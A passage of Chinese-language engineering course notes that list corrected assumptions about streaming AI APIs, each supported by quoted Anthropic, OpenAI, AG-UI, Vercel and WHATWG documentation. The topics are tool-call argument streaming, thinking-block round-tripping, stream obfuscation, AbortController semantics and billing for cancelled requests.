> "2. A series of content blocks, each of which has a `content_block_start`, one or more `content_block_delta` events, and a `content_block_stop` event. Each content block has an `index` that corresponds to its index in the final Message `content` array. **One exception: during server-side fallback responses, a `fallback` content block arrives at each model boundary as a `content_block_start` and `content_block_stop` pair with no deltas in between.**"
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

**为什么重要**：一个「零 delta 的空 content block」是**模型边界的标记**。如果你的解析器假设「每个 content block 至少有一个 delta」，它会在 fallback 发生时静默出错。而且这直接影响 UI：**你在流中途可能需要告诉用户「这段是另一个模型写的」**。这是普通 Web 应用里完全没有对应物的问题。

---

#### INV-22 · AG-UI 是一个有版本号的规范

**实际**：它是一个活规范，有事件枚举但**没有**像 MCP 那样的带日期的不可变快照版本。

仓库自述：

> "AG-UI is an open, lightweight, event-based protocol that standardizes how AI agents connect to user-facing applications."
> "- During agent executions, agent backends **emit events _compatible_ with one of AG-UI's ~16 standard event types**"
> "- Works with **any event transport** (SSE, WebSockets, webhooks, etc.)"
> "- Allows for **loose event format matching**, enabling broad agent and app interoperability"
> —— ag-ui-protocol/ag-ui, github.com/ag-ui-protocol/ag-ui，访问 2026-09-15 `[P]`

事件枚举（我引的是钉住的 revision，`1cedb73e`）：

> ```
> enum EventType {
>   TEXT_MESSAGE_START, TEXT_MESSAGE_CONTENT, TEXT_MESSAGE_END,
>   TOOL_CALL_START, TOOL_CALL_ARGS, TOOL_CALL_END, TOOL_CALL_RESULT,
>   STATE_SNAPSHOT, STATE_DELTA, MESSAGES_SNAPSHOT,
>   ACTIVITY_SNAPSHOT, ACTIVITY_DELTA,
>   RAW, CUSTOM,
>   RUN_STARTED, RUN_FINISHED, RUN_ERROR,
>   STEP_STARTED, STEP_FINISHED,
>   REASONING_START, REASONING_MESSAGE_START, REASONING_MESSAGE_CONTENT,
>   REASONING_MESSAGE_END, REASONING_MESSAGE_CHUNK, REASONING_END,
>   REASONING_ENCRYPTED_VALUE,
> }
> ```
> —— ag-ui-protocol/ag-ui, `docs/sdk/js/core/events.mdx` @ `1cedb73e`，访问 2026-09-15 `[P]`

注意 `REASONING_ENCRYPTED_VALUE` —— 这是 INV-32/INV-33 那套「加密 reasoning 必须原样回传」的约束在 UI 协议层的投影。`[P2]`

已弃用的事件：

> "The `THINKING_*` events are deprecated and will be removed in version 1.0.0. New implementations should use `REASONING_*` events instead." `[P]`

运行生命周期：

> "A typical agent run follows a predictable pattern: it begins with a `RunStarted` event, may contain multiple optional `StepStarted`/`StepFinished` pairs, and concludes with either a `RunFinished` event (success) or a `RunError` event (failure)."
> —— ag-ui-protocol/ag-ui, `docs/concepts/events.mdx` @ `d53c4ef6`，访问 2026-09-15 `[P]`

工具调用同样是 start/args/end 三段式：

> "When an agent needs to use a tool, it emits a `ToolCallStart` event, followed by one or more `ToolCallArgs` events that stream the arguments being passed to the tool, and concludes with a `ToolCallEnd` event." `[P]`

**关于版本号我要明确说一句**：有一个二手站点声称当前包版本是 `@ag-ui/core 0.0.59` 且「公开文档没有暴露单一的协议级语义版本」`[S]`。**我没有从一手来源核实这个版本号，所以不把它当数字用。** 学员要用的话，结论是：**钉 revision，不要钉「版本」**。

**为什么重要**：三个协议（AI SDK data stream / AG-UI / MCP Apps）里，**只有 MCP Apps 有带日期的稳定版本**（见 INV-39）。这是选型时的一个硬事实。

---

### 流式工具调用的渲染

#### INV-23 · 工具参数是逐字符流过来的，所以你总会看到半个 JSON

**实际**：**默认不是。** 默认模型一次只发一个完整的 key-value 对。要真正拿到「半个参数」，你得显式开 `eager_input_streaming`。

> "Note: Current models only support emitting one complete key and value property from `input` at a time. As such, when using tools, there may be delays between streaming events while the model is working. Once an `input` key and value are accumulated, they are emitted as multiple `content_block_delta` events with chunked partial JSON so that the format can automatically support finer granularity in future models."
> —— Anthropic, *Streaming messages* / Input JSON delta，访问 2026-09-15 `[P]`

> "Tool use supports fine-grained streaming for parameter values. Enable it per tool with `eager_input_streaming`."
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

**为什么重要**：这条同时解释了一个 UI 现象：**工具调用的「卡顿」是规范内行为**（"there may be delays between streaming events while the model is working"）。一个在 tool call 期间显示打字机光标的 UI，会显示出一个长时间不动的光标 —— 这不是你的 bug。

---

#### INV-24 · 流式 JSON 拼完了就能 parse

**实际**：开了 fine-grained 之后，**服务端不做任何校验**，拼出来的字符串**不保证是合法 JSON**。官方明说。

> "Because the API does not buffer or validate a tool's input before streaming it, you might receive partial or invalid JSON. A response that ends with the stop reason `max_tokens` can also cut a parameter off midway. Accumulate the fragments, guard the parse, and see Handling invalid JSON in tool responses for how to return unparseable input to Claude."
> —— Anthropic, *Fine-grained tool streaming*, platform.claude.com/docs/en/agents-and-tools/tool-use/fine-grained-tool-streaming，访问 2026-09-15 `[P]`

> "The accumulation contract is the same as for standard tool-use streaming, so this section applies with and without `eager_input_streaming`. Fine-grained tool streaming changes what you can assume about the result: **the server streams fragments without validating them, so the accumulated string might not be valid JSON.**" `[P]`

官方 SDK 示例里的注释逐字如下（在 Python / TS / C# / Go / Java / PHP / Ruby 七种语言里重复了七遍）：

> "// The accumulated string is not guaranteed to be valid JSON." `[P]`

**官方给的失败处理方式非常具体** —— 不要修 JSON，把原始串包起来回传给模型：

> "With fine-grained tool streaming, the accumulated input for a tool call might be invalid or incomplete JSON. When it is, you cannot run the tool, so report the failure back to Claude instead. The `content` of a tool result does not have to be JSON, but wrapping the raw string in a JSON object under a single key makes it unambiguous to Claude that you received invalid JSON, and preserves the original input for debugging:"
> ```
>   "INVALID_JSON": "<the unparseable input you received>"
> ```
> "Build the wrapper with your JSON library rather than by concatenating strings, so quotes and other special characters in the invalid input are escaped correctly." `[P]`

---

#### INV-25 · 「什么时候可以安全地把半个参数显示给用户」没有标准答案

**实际**：有。官方的累积契约明确给出了**唯一的安全提交点**：`content_block_stop`。

累积算法（官方三步）：

> "1. On `content_block_start` with `type: "tool_use"`, initialize an empty string: `input_json = ""`
> 2. For each `content_block_delta` with `type: "input_json_delta"`, append: `input_json += event.delta.partial_json`
> 3. On `content_block_stop`, parse the accumulated string"
> —— Anthropic, *Fine-grained tool streaming*，访问 2026-09-15 `[P]`

> "You can accumulate the string deltas and parse the JSON once you receive a `content_block_stop` event, by using a library like Pydantic to do partial JSON parsing, or by using the SDKs, which provide helpers to access parsed incremental values."
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

而且 `max_tokens` 会在参数中间切断，这时候**不能执行，只能重试**：

> "Guard the parse, as the following SDK examples do. A response can also stop at `max_tokens` midway through a parameter. Check the stop reason and decide whether to retry the request with a higher `max_tokens` or repair the partial input." `[P]`

> "## Incomplete tool use blocks — If Claude's response is cut off because it hit the `max_tokens` limit, and the truncated response contains an incomplete tool use block, you'll need to retry the request with a higher `max_tokens` value to get the full tool use."
> —— Anthropic, *Stop reasons and fallback*, platform.claude.com/docs/en/build-with-claude/handling-stop-reasons，访问 2026-09-15 `[P]`

SDK 提供的「安全展示」中间层是一个 snapshot：

> "#### `input_json` — This event is yielded whenever a JSON `content_block_delta` event is returned by the API & includes the delta and the accumulated snapshot, e.g.
> ```py
> if event.type == "input_json":
>     event.partial_json  # ' there"'
>     event.snapshot  # '{"message": "Hello, there"'
> ```"
> —— anthropics/anthropic-sdk-python, `helpers.md`，访问 2026-09-15 `[P]`

而 snapshot 在 beta 模式下的行为是不一样的 —— SDK 测试里把这个分支叫「trailing strings mode」，由 beta header `fine-grained-tool-streaming-2025-05-14` 触发 `[P]`（源码：`anthropic-sdk-python` `tests/lib/streaming/test_partial_json.py`）。

**所以「边界」的答案是三层，全部可测**：
1. **参数值可以展示**（用 snapshot，展示已完整的 key-value）——用户能看到「正在写 `path: "src/app.tsx"`」。
2. **参数不能用于执行**，直到 `content_block_stop` 且 parse 成功。
3. **`stop_reason` 是 `max_tokens` 时，已展示的内容必须撤回**（回到 INV-19 的 `reset-step`）。

---

#### INV-26 · SSE chunk 的内容就是数据

**实际**：OpenAI 往每个 delta 事件里塞随机字符，**目的是防侧信道攻击** —— 即 SSE 的 payload 长度本身被官方认定为一条信息泄露通道。而且这是**默认开启**的。

> "include_obfuscation: bool
> When true, stream obfuscation will be enabled.
> Stream obfuscation adds random characters to an `obfuscation` field on streaming delta events to normalize payload sizes as a mitigation to certain side-channel attacks. These obfuscation fields are included by default, but add a small amount of overhead to the data stream. You can set `include_obfuscation` to false to optimize for bandwidth if you trust the network links between your application and the OpenAI API."
> —— openai-python, `src/openai/types/chat/chat_completion_stream_options_param.py`（由 OpenAPI spec 生成），访问 2026-09-15 `[P]`

Responses API 的客户端事件参数里有同一段文字 `[P]`（openai-python `responses_client_event_param.py`）。

实际线上看到的样子（第三方仓库的 curl 记录，作为格式示例 `[P2]`）：

> `data: {"id":"chatcmpl-...","object":"chat.completion.chunk",...,"choices":[{"index":0,"delta":{"content":"Hello"},"finish_reason":null}],"obfuscation":"A9"}`
> —— zed-industries/zed issue #52504，访问 2026-09-15 `[P2]`

**为什么重要**：两层。第一层是 INV-20 的宽松解析 —— 不容忍未知字段的客户端会挂。第二层更深：**加密传输不隐藏长度。** 逐 token 的 SSE 流把「每个 token 的字节长度」暴露给任何能看到密文大小的中间人，而 token 长度和 token 内容是相关的。这条直接接 L14（信道）和 L15（可观测的东西就是可泄露的东西）。**厂商为此付出了默认带宽开销 —— 这说明他们认为威胁是真的。**

---

#### INV-27 · 并行工具调用的事件是分组到达的

**实际**：会交错。归位靠 `output_index` / `item_id`，全局顺序靠 `sequence_number`。

OpenAI Responses API 的事件类型定义（SDK 源码）：

> ```
> /**
>  * Emitted when there is a partial function-call arguments delta.
>  */
> export interface ResponseFunctionCallArgumentsDeltaEvent {
>  /** The function-call arguments delta that is added. */
>  delta: string;
>  /** The ID of the output item that the function-call arguments delta is added to. */
>  item_id: string;
>  /** The index of the output item that the function-call arguments delta is added to. */
>  output_index: number;
>  /** The sequence number of this event. */
>  sequence_number: number;
>  /** The type of the event. Always `response.function_call_arguments.delta`. */
>  type: 'response.function_call_arguments.delta';
> }
> ```
> —— openai-node, `src/resources/responses/responses.ts` @ `c9a4d688`，访问 2026-09-15 `[P]`

并行是显式开关：

> "/** Whether to allow the model to run tool calls in parallel. */ parallel_tool_calls: boolean;" `[P]`

最终的工具调用对象里，参数是**字符串**：

> "/** A JSON string of the arguments to pass to the function. */ arguments: string;" `[P]`
> "/** The unique ID of the function call generated by the model. */ call_id: string;" `[P]`

Anthropic 侧用的是 `index`：

> "Each content block has an `index` that corresponds to its index in the final Message `content` array."
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

delta 事件里携带 index：

> `data: {"type": "content_block_delta","index": 1,"delta": {"type": "input_json_delta","partial_json": "{\"location\": \"San Fra"}}}` `[P]`

**为什么重要**：**「用一个累加器拼参数」在并行工具调用下会把两个工具的参数拼串。** 这是本节最容易写出来的 bug，也是第 10 节最干净的一条确定性断言：喂一段交错的事件流，断言两个 tool call 的参数各自正确。

---

#### INV-28 · `content_block_start` 里的 `input` 是参数的初始值

**实际**：它是一个空对象占位符，而且和 delta 的类型**故意不一致**。

> "When a `tool_use` content block streams, the initial `content_block_start` event contains `input: {}` (an empty object). This is a placeholder. The actual input arrives as a series of `input_json_delta` events, each carrying a `partial_json` string fragment."
> —— Anthropic, *Fine-grained tool streaming*，访问 2026-09-15 `[P]`

> "The type mismatch between the initial `input: {}` (object) and `partial_json` (string) is by design. The empty object marks the slot in the content array. The delta strings build the real value." `[P]`

> "The deltas for `tool_use` content blocks correspond to updates for the `input` field of the block. To support maximum granularity, the deltas are partial JSON strings, whereas the final `tool_use.input` is always an object."
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

**为什么重要**：一个按 TypeScript 类型直觉写的 reducer（`input = {...input, ...delta}`）会在这里炸掉。**同一个字段在三个阶段有三种类型：`{}` → `string` 累积 → `object`。**

---

#### INV-29 · 流里只有内容事件

**实际**：Anthropic 流里会插入**任意数量**的 `ping`，而且官方要求你优雅处理未知事件。

> "### Ping events — Event streams may also include any number of `ping` events."
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

官方示例流里 `ping` 出现在 `message_start` 之后、`message_stop` 之前，而且连着出现多次 `[P]`：

> ```
> event: ping
> data: {"type": "ping"}
> ```

**为什么重要**：结合 INV-16 —— 一个 `ping` 事件如果被 CDN 切掉了 `data:` 行，就变成一个「已知 event 名 + 空 data」的事件，正好命中 `JSON.parse('')` 崩溃路径。**保活机制本身成了崩溃源。**

---

### 思考/推理内容的展示约束（这是合规约束，不是设计选择）

#### INV-30 · 你可以拿到模型的原始思维链，只要开个参数

**实际：任何设置都拿不到。官方明文。**

> "When `display` is `"summarized"`, the thinking text you receive is a summary of Claude's full thinking process rather than the raw chain of thought. Summarized thinking provides the full intelligence benefits of thinking while preventing misuse. **No `display` setting returns the raw chain of thought.**"
> —— Anthropic, *Thinking*, platform.claude.com/docs/en/build-with-claude/thinking，访问 2026-09-15 `[P]`

> "You don't always see this text, and what you see is never the raw chain of thought: the text in a thinking block is a summary of Claude's reasoning." `[P]`

OpenAI 侧同样：

> "Persisted reasoning provides continuity; it does not expose the model's raw reasoning. The reasoning items remain opaque, and the API does not return their reasoning text."
> —— OpenAI, *Reasoning models*, developers.openai.com/api/docs/guides/reasoning，访问 2026-09-15 `[P]`

> "While we don't expose the raw reasoning tokens emitted by the model, you can view a summary of the model's reasoning using the `summary` parameter." `[P]`

> "Reasoning summary output is part of the `summary` array in the `reasoning` output item. This output will not be included unless you explicitly opt in to including reasoning summaries." `[P]`

OpenAI 甚至对「谁能看摘要」加了组织级门槛：

> "Before using summarizers with our latest reasoning models, you may need to complete organization verification to ensure safe deployment." `[P]`

**为什么重要**：**「展示 agent 的思考过程」这件事在 2026 年有一个天花板，而且天花板是厂商画的，不是你的 UI 能力画的。** 你能展示的最多是摘要。教学上这一条要讲清楚，否则学员会去设计一个展示不存在的数据的界面。

---

#### INV-31 · 默认能拿到 thinking 文本，只是要不要显示的问题

**实际**：在当前主力模型上，`display` 默认是 `"omitted"` —— **默认拿到的是空字符串**，但照样计费。

> "The `display` field on the thinking configuration controls whether that summary is returned at all: `"summarized"` returns it, while `"omitted"`, the default on many models, returns thinking blocks with an empty `thinking` field. Either way the block is billed the same and passed back the same in multi-turn conversations."
> —— Anthropic, *Thinking*，访问 2026-09-15 `[P]`

> "On Claude Opus 5, Claude Sonnet 5, Claude Fable 5.1, Claude Mythos 5.1, Claude Fable 5, Claude Mythos 5, and Claude Mythos Preview, thinking is already on and needs no configuration. `display` defaults to `"omitted"` on these models, so the thinking text is hidden until you opt in. Opt in with `thinking: {"type": "adaptive", "display": "summarized"}`" `[P]`

计费与 `max_tokens`：

> "Thinking has a cost: the tokens Claude spends reasoning are billed as output tokens, even when the thinking text isn't returned to you, and they count toward `max_tokens` alongside the response text." `[P]`

> "- You're still charged for the full thinking tokens. Omitting reduces latency, not cost." `[P]`

第三种模式（beta）专门为「等待期 UI」设计：

> "- `"updates"` (beta): reasoning blocks are returned with an empty `thinking` field, as with `"omitted"`, and the short progress updates some models write between tool calls come back as readable text. Requires the beta header `thinking-display-updates-2026-08-18`." `[P]`

> "A pause of several seconds before the progress-update block opens is normal" `[P]`

**为什么重要**：`display: "updates"` 是**厂商专门为「等待期该显示什么」造的一个 API**。这是欠条 4（延迟是产品设计的第一约束）在协议层最直接的证据：**厂商加了一个字段，唯一用途就是给等待期填内容。**

---

#### INV-32 · 隐藏 thinking 只影响 UI

**实际**：它影响 **TTFT**，而且这是官方给出的主要收益。这是一个真实的「透明度 vs 延迟」权衡。

> "Set `display: "omitted"` when your application doesn't surface thinking content to users. **The primary benefit is faster time-to-first-text-token when streaming: the server skips streaming thinking tokens entirely and delivers only the signature, so the final text response begins streaming sooner.**"
> —— Anthropic, *Thinking*，访问 2026-09-15 `[P]`

流事件层面的差异：

> "- When streaming with `display: "omitted"`, no `thinking_delta` events are emitted. With `display: "updates"`, only progress-update blocks stream `thinking_delta` events." `[P]`

`"omitted"` 时的事件序列（官方 trace）：

> ```
> data: {"type":"content_block_start","index":0,"content_block":{"type":"thinking","thinking":"","signature":""}}
> data: {"type":"content_block_delta","index":0,"delta":{"type":"signature_delta","signature":"EosnCkYICxIMMb3LzNrMu..."}}
> event: content_block_stop
> data: {"type":"content_block_stop","index":0}
> ```
> —— Anthropic, *Thinking* / Full streaming event trace，访问 2026-09-15 `[P]`

> "When `display: "omitted"` is set, the thinking block opens, a single `signature_delta` arrives, and the block closes without any `thinking_delta` events. Text streaming begins immediately after" `[P]`

正常（`summarized`）模式下 signature 的位置：

> "Thinking blocks stream as `thinking_delta` events inside `content_block_delta` events, followed by a single `signature_delta` event just before the block's `content_block_stop`. Text blocks stream afterward as usual." `[P]`

> "The `signature` field is identical whichever `display` value you set. Switching `display` values between turns in a conversation is supported." `[P]`

**为什么重要**：**「给用户展示思考过程」是要付延迟的。** 这不是感觉，是服务端行为差异。一个产品决策（要不要展示 thinking）直接改变了 TTFT —— 这正是欠条 4 说的「延迟不是性能指标，是产品设计的第一约束」。

---

#### INV-33 · thinking 块是展示用的，可以自由处理

**实际：它必须原样回传，改了就 400。这是本节唯一的硬合规约束。**

> "2. Preserving thinking blocks: when you return tool results, you must pass the thinking blocks from the assistant message back to the API, complete and unmodified."
> —— Anthropic, *Thinking*，访问 2026-09-15 `[P]`

> "When Claude invokes a tool, it pauses construction of its response to await external information. When you return the tool result, Claude continues building that same response, so its earlier reasoning must still be present. Pass every `thinking` block back to the API complete and unmodified, alongside the `tool_use` block it accompanied." `[P]`

> "- If you pass thinking blocks back in multi-turn conversations, pass them unchanged. The server decrypts the `signature` to reconstruct the original thinking for prompt construction. Any text you place in the `thinking` field of a round-tripped omitted block is ignored." `[P]`

> "Each thinking block also carries a `signature` field, an encrypted copy of the full reasoning that you pass back unchanged in multi-turn and tool-use conversations" `[P]`

顺序也不能动（AWS Bedrock 的 Claude 文档说得最直白）：

> "When providing thinking blocks, the entire sequence of consecutive thinking blocks must match the outputs generated by the model during the original request; you cannot rearrange or modify the sequence of these blocks."
> —— AWS, *Extended thinking*, docs.aws.amazon.com/bedrock/latest/userguide/claude-messages-extended-thinking.html，访问 2026-09-15 `[P]`

> "During tool use, you must pass thinking blocks back to the API, and you must include the complete unmodified block back to the API. This is critical for maintaining the model's reasoning flow and conversation integrity." `[P]`

> "- Tool choice limitation: Tool use with thinking only supports `tool_choice: auto` (default) or `tool_choice: none`. It does not support forced tool use (`any` or specifying a specific tool)." `[P]`

**最常见的触发方式恰恰是前端工程师的标准操作** —— 按 type 过滤 content blocks：

> "## A 400 error says thinking blocks cannot be modified
> In multi-turn and tool-use conversations you send previous assistant messages, including their `thinking` and `redacted_thinking` blocks, back to the API, and the API verifies they arrive unmodified. This error happens when the assistant message you send back differs from the one the API returned, **most often because your code filters content blocks by type and drops `redacted_thinking` blocks, or rebuilds the assistant message instead of echoing it.**"
> —— Anthropic, *Troubleshooting thinking*, platform.claude.com/docs/en/build-with-claude/thinking-troubleshooting，访问 2026-09-15 `[P]`

**为什么重要**：**「前端拿到的消息对象不是一个可以自由重构的视图模型，它是一份必须逐字节保真的凭证。」** 这句话对一个习惯了 `messages.map(m => ({role: m.role, content: m.text}))` 的前端工程师来说是彻底反直觉的。

---

#### INV-34 · 客户端做上下文压缩是安全的

**实际**：在 Claude Fable 5.1 上，**客户端压缩会让 thinking 块失效** —— 因为签名绑定的是整个前缀。这条直接打 L03。

> "On Claude Fable 5.1, the API accepts a replayed thinking block only while the `system` prompt, `tools`, and messages that preceded it are unchanged. The error means something earlier in the conversation changed between requests: an [edited], reordered, or removed turn, a per-turn reminder that was [added] and later removed, a rebuilt `system` prompt or `tools` array, or **client-side compaction that kept recent turns and their thinking verbatim.** The check is enforced for new accounts created on or after August 31, 2026, and for any request that sets `thinking.block_binding.prefix_mismatch_behavior`. **Server-side compaction and context editing never trigger it.**"
> —— Anthropic, *Troubleshooting thinking*，访问 2026-09-15 `[P]`

设计意图（这解释了为什么这是安全机制而非性能机制）：

> "When you send a block back, the API uses its `signature` to check that the prior conversation is unchanged and that the current model can read the block. **The check exists so that reasoning produced under one set of instructions can't be replayed under another, potentially adversarial set of instructions.**"
> —— Anthropic, *Preserved thinking*, platform.claude.com/docs/en/build-with-claude/preserved-thinking，访问 2026-09-15 `[P]`

两种失配行为，由 beta header `thinking-binding-controls-2026-08-01` 控制：

> "- `"drop_block"`: the API removes the block and every thinking block after it in the conversation, and the request succeeds. Dropped blocks aren't billed. The response lists them in a top-level `input_transformations` array (on the `message_start` event when streaming)."
> "- `"error"`: the API rejects the request with a 400 `invalid_request_error` that names the first failing block." `[P]`

模型不匹配时是无条件丢弃：

> "A block that fails the model check is always dropped." `[P]`

修复方式是「历史只能 append」：

> "To fix it, keep the history append-only: pass earlier turns back exactly as sent and received, add instructions with a mid-conversation system message instead of editing `system` or `tools`, and let server-side context editing or compaction do any trimming. **Retrying the same request body doesn't clear the error.**" `[P]`

而且不需要自己剪枝 —— 服务端会做，并且只对实际用到的块计费：

> "You don't need to prune old thinking yourself. Pass all thinking blocks back in multi-turn conversations, and the API automatically filters them, keeps the blocks needed to preserve the model's reasoning, and bills input tokens only for the blocks actually shown to Claude."
> —— Anthropic, *Thinking*，访问 2026-09-15 `[P]`

**为什么重要**：**这是 L03（上下文压缩）和 L16（前端）之间一条没人预料到的耦合。** 学员在 L03 学的「客户端压缩历史」这个技能，在开了 thinking 的当前模型上会**直接报 400**。而 `input_transformations` 数组正好出现在 `message_start` 事件里 —— 也就是说**前端在流的第一个事件里就能知道「服务端刚刚丢掉了哪些推理」**，这是一个可以渲染的 UI 状态。

---

#### INV-35 · 流式拿 reasoning 和非流式一样

**实际**：OpenAI 明确规定流式下必须用 `response.output_item.done` 的 `encrypted_content`，`added` 里的**可能不完整**。

> "encrypted_content: Optional[str] = None
> The encrypted content of the reasoning item.
> This is populated by default for reasoning items returned by `POST /v1/responses` and WebSocket `response.create` requests.
> **When streaming, use the completed reasoning item and its `encrypted_content` from the `response.output_item.done` event in subsequent requests. The `encrypted_content` in `response.output_item.added` may be incomplete.** This is especially important when `store` is `false` or when using Zero Data Retention."
> —— openai-python, `src/openai/types/responses/response_reasoning_item.py`，访问 2026-09-15 `[P]`

同一个类型的 docstring 也强调了必须回传：

> "A description of the chain of thought used by a reasoning model while generating a response. **Be sure to include these items in your `input` to the Responses API for subsequent turns of a conversation if you are manually managing context.**" `[P]`

状态字段有三态：

> "status: Optional[Literal["in_progress", "completed", "incomplete"]] — The status of the item. One of `in_progress`, `completed`, or `incomplete`. Populated when items are returned via API." `[P]`

无状态模式下的要求：

> "When you create a response in stateless mode, reasoning items in the response's `output` array include an `encrypted_content` property by default. Stateless mode applies when `store` is `false` or when your organization uses Zero Data Retention (ZDR)."
> —— OpenAI, *Reasoning models*，访问 2026-09-15 `[P]`

> "For stateless reasoning-model requests, preserve every item in the response's `output` array. The Responses API returns encrypted reasoning items by default. Replaying the complete output keeps reasoning items and assistant `phase` values intact."
> —— OpenAI, *Conversation state*, developers.openai.com/api/docs/guides/conversation-state，访问 2026-09-15 `[P]`

> "// Add all response output items, including reasoning items, to the history — history.push(...response.output);" `[P]`

`include` 参数的说明：

> "`reasoning.encrypted_content`: Includes an encrypted version of reasoning tokens in reasoning item outputs. This enables reasoning items to be used in multi-turn conversations when using the Responses API statelessly (like when the `store` parameter is set to `false`, or when an organization is enrolled in the zero data retention program)."
> —— OpenAI, *List items* API reference，访问 2026-09-15 `[P]`

第三方生态里这条踩坑的证据（作为「这个坑真的很深」的线索，**不用于任何结论**）：

> "OpenAI emits an empty placeholder on `response.output_item.added` and the final encrypted payload on `response.output_item.done`. ChatOpenAI now merges the completed payload into streamed output and skips empty payloads during stateless replay."
> —— langchain-ai/langchain PR #39635，访问 2026-09-15 `[S]`

**为什么重要**：**这是一个只在流式路径上存在的正确性 bug。** 非流式代码跑得好好的，改成流式之后下一轮请求开始报错。而且它和 INV-33 一样，惩罚的是「重建消息对象」这个前端标准操作。

---

### 中断与取消

#### INV-36 · `AbortController` 是个便利封装

**实际**：它是 DOM 规范里的两个 interface，`AbortSignal` 是 `EventTarget`，而且有正式的 abort algorithm 和 abort reason 概念。

> "AbortController is an object that allows you to abort one or more DOM requests as and when desired."
> "### Interface `AbortController`
> ```
> [Exposed=*]
> interface AbortController {
>   constructor();
>   [SameObject] readonly attribute AbortSignal signal;
>   undefined abort(optional any reason);
> };
> ```"
> —— WHATWG DOM Standard, *3.2 Interface AbortController*, dom.spec.whatwg.org/#interface-abortcontroller，访问 2026-09-15 `[P]`

> "```
> [Exposed=*]
> interface AbortSignal : EventTarget {
>   [NewObject] static AbortSignal abort(optional any reason);
>   [Exposed=(Window,Worker), NewObject] static AbortSignal timeout([EnforceRange] unsigned long long milliseconds);
>   [NewObject] static AbortSignal _any(sequence<AbortSignal> signals);
>   readonly attribute boolean aborted;
>   readonly attribute any reason;
>   undefined throwIfAborted();
>   attribute EventHandler onabort;
> };
> ```"
> —— WHATWG DOM Standard, *3.1 Interface AbortSignal*，访问 2026-09-15 `[P]`

关键语义：

> "The `aborted` getter steps are to return true if this is aborted; otherwise false." `[P]`
> "The `reason` getter steps are to return this's abort reason." `[P]`
> "The `throwIfAborted()` method steps are to throw this's abort reason, if this is aborted." `[P]`
> "The static `abort(reason)` method steps are: 1. Let signal be a new AbortSignal object. 2. Set signal's abort reason to reason if it is given; otherwise to a new "AbortError" DOMException." `[P]`

**重点：abort 是幂等且单向的**：

> "To signal abort, given an AbortSignal object signal and an optional any reason: 1. **If signal is aborted, then return.**"
> —— WHATWG DOM Standard, *3.3 Using AbortController and AbortSignal objects in APIs*，访问 2026-09-15 `[P]`

而且 abort 会**同步**清空监听器：

> "6. Empty signal's abort algorithms." `[P]`

合并多个 signal：

> "The static `any(signals)` method steps are to return the result of creating a dependent abort signal from signals using AbortSignal and the current realm." `[P]`

规范建议的 API 设计模式：

> "APIs that rely upon AbortController are encouraged to accept an AbortSignal object in a dictionary argument named `signal`, e.g., `doAmazingness({ signal })`." `[P]`

规范给的「不可取消的操作也要检查一次」的建议 `[P2]`：

> "Even if an API does not support aborting an ongoing operation, it can still accept an AbortSignal and check `signal`'s aborted flag before starting the operation."

**为什么重要**：**`AbortSignal.any()` 是 agent 前端里被严重低估的一个 API。** 一个 agent 请求实际上有至少三个取消源：用户点停止、超时、页面导航。规范提供了组合它们的标准方式。而 `throwIfAborted()` 提供的是「在循环的每一步检查」这个模式的标准写法 —— 这正是 agent loop 需要的。

---

#### INV-37 · 点了停止就不花钱了

**实际：Anthropic 官方明说会计费。**

> "Note that you will still be billed for any tokens generated prior to receiving the cancellation."
> —— Anthropic, *Errors* / Request cancellation, platform.claude.com/docs/en/api/errors，访问 2026-09-15 `[P]`

而这句话所在的上下文本身就是一条更深的 UI 约束：

> "APIs can be disconnected mid-request, in which case all usages are immediately cancelled."
> —— Anthropic, *Errors*，访问 2026-09-15 `[P]`

OpenAI 侧我要明确说：**我没有找到「客户端断连后是否继续计费」的一手明文。** 见第 9 节。有一手依据的是 Responses API 的显式取消端点及其限制：

> "Only responses created with the `background` parameter set to `true` can be cancelled."
> —— OpenAI, *Cancel a response* API reference, developers.openai.com/api/docs/api-reference/responses/cancel，访问 2026-09-15 `[P]`

以及后台模式下取消后的状态：

> "You can also cancel an in-flight response…" / 后台响应的状态机包含 `queued`, `in_progress`, `completed`, `failed`, `incomplete`, `cancelled` `[P]`（OpenAI *Background mode*, developers.openai.com/api/docs/guides/background）

**为什么重要**：**「停止」按钮不是免费的，这件事必须反映在 UI 上。** 一个显示「已停止 · 未产生费用」的界面是在骗用户。而且这条和 INV-13 的「abort 端点」设计连在一起：既然要花钱，就更有理由把「停止」做成一个服务端能真正杀掉生成的显式动作，而不是单纯断开 HTTP 连接。

---

#### INV-38 · 中断之后把最后一条消息删掉就行

**实际**：不行，原因有两个，都是一手。

**第一，被截断的助手消息本身会改变模型后续行为。** Anthropic 的 prefill 机制文档（注意这里同时是一条反转，见下）：

> "Assistant message prefilling is no longer supported on Claude Opus 5, Claude Sonnet 5, Claude Fable 5.1, Claude Mythos 5.1, Claude Fable 5, Claude Mythos 5, and Claude Mythos Preview. Sending a trailing `assistant` message returns a 400 error. Prefilling remains supported on Claude 4.x models and earlier."
> —— Anthropic, *Prefill Claude's response*, platform.claude.com/docs/en/build-with-claude/prefill-claudes-response，访问 2026-09-15 `[P]`

**这就是 INV-38 的硬结论**：在当前主力模型上，**你不能把一条被截断的助手消息留在历史末尾再发下一个请求 —— 会 400。** 「保留部分输出让模型续写」这个直觉在 2026 年的模型上是行不通的。

替代方案是官方给的（用 system message 或 user message 引导）：

> "Use a system prompt to specify output format requirements, or a user message that states the format explicitly." `[P]`

而旧模型上 prefill 的语义（作为对比）：

> "Claude continues from the prefilled text rather than starting a fresh response, so the completion begins mid-structure." `[P]`
> "You cannot use trailing whitespace in a prefill. The API rejects `"content": "The answer is "` with a validation error." `[P]`

**第二，Vercel AI SDK 的线协议里有一个专门的 `abort` 事件** —— 也就是说「被中断」是一个需要在消息里表示的状态，不是一个「删掉就行」的非状态：

> ```
>  | {
>  type: 'abort';
>  }
> ```
> —— `ai@7.0.101`, `ui-message-chunks.ts`，访问 2026-09-15 `[P]`

文档：

> "### Abort Part — A part indicating that the stream was aborted. `data: {"type":"abort"}`"
> —— Vercel AI SDK, *AI SDK UI: Stream Protocols*，访问 2026-09-15 `[P]`

INV-13 引用的官方停止端点步骤里，第 2 步就是「持久化部分消息」：

> "2. Persist the latest partial assistant message if the client sends one" `[P]`

